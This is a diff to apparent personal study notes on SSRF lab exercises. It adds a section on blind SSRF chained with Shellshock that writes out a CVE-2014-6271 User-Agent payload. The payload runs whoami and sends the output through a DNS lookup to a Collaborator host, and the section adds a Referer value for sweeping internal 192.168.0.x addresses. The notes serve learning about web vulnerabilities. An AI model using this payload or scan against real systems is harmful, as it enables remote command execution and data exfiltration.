@@ -82,6 +82,14 @@ Finding hidden attack surface for SSRF vulnerabilities:
 - Description:
 + We can use vulnerabilities param path to redirect url to vuln api endpoint
 
+06_Blind_SSRF_with_Shellshock_exploitation
+- Find api endpoint that request back to server -> Change url -> delete target account
+- Description:
++ We replace User-Agent headers with this
+    () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
+    + This is payload for CVE-2014-6271, trick bash when it trying to import empty function then continue execute command after it
++ Change referer header to this and try bruteforce from 1 to 255
+    http://192.168.0.{i}:8080
 
 07_SSRF_with_whitelist_based_input_filter
 - Find api endpoint that request back to server -> Change url -> delete target account
